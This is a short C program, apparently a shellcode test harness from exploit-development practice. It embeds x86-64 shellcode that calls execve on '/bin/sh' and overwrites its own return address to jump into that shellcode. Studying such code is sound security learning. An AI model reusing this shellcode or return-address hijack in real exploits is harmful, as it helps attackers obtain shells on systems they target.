int main() {
    long *ret;
    char shellcode[] = "\xeb\x18\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\xff\x48\x31\xc0\x88\x05\xf6\xff\xff\xff\x48\x8d\x3d\xe8\xff\xff\xff\x48\x89\x05\xd9\xff\xff\xff\x48\x89\x3d\xca\xff\xff\xff\x48\x8d\x35\xc3\xff\xff\xff\x31\xd2\xb0\x3b\x0f\x05";

    ret = ((long *) &ret) + 2;
    *ret = (long) shellcode;

    return 333;
}
